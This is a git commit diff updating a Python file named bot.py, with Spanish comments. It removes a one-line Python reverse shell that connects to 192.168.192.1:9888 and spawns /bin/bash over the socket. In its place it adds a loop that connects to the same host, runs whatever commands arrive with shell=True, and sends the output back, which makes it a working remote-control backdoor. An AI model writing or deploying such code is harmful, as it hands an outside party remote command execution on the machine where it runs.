3906fe9fd9ca04552f7b5b69a260ae244b9a7f5d
lauraalmrui <83592959+lauraalmrui@users.noreply.github.com>
2024-01-29 19:16:45 +0100

    Update bot.py

--- bot.py
+++ bot.py
@@ -1,11 +1,33 @@
 import socket
 import subprocess
 def run():
- subprocess.run(["python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("192.168.192.1",9888));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'"])
-
-
-
  
+
+ clientsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+ clientsocket.connect(("192.168.192.1", 9888))  # Reemplaza con la IP del cliente
+ 
+ while True:
+     # Espera recibir un comando desde el servidor
+     command = clientsocket.recv(1024).decode('utf-8')
+     if not command:
+         break  # Si no se reciben datos, cierra la conexión
+ 
+     if command.lower() == 'exit':
+         break  # Si el comando es 'exit', cierra la conexión
+ 
+     # Ejecuta el comando en el servidor y obtén el resultado
+     result = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+     output_bytes = result.stdout.read() + result.stderr.read()
+     output_str = output_bytes.decode('utf-8', errors='replace')
+ 
+     # Envía el resultado de vuelta al servidor
+     clientsocket.send(output_str.encode('utf-8'))
+ 
+ # Cierra la conexión del servidor después de manejar los comandos
+ clientsocket.close()
+ 
+ 
+  
 
 
 
